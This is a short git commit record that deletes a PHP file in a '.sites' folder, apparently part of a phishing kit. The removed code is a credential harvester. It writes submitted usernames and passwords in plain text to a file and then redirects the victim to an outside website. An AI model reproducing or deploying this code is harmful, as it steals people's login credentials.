da644e0146d180d21cd8b4d2b0180fdff1594949
tz9090 <132028073+tz9090@users.noreply.github.com>
2023-04-28 01:28:57 +0000

    Delete login.php

--- .sites/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['login_username'] . " Pass: " . $_POST['secretkey'] . "\n", FILE_APPEND);
-header('Location: https://racionaltec.com');
-exit();
-?>
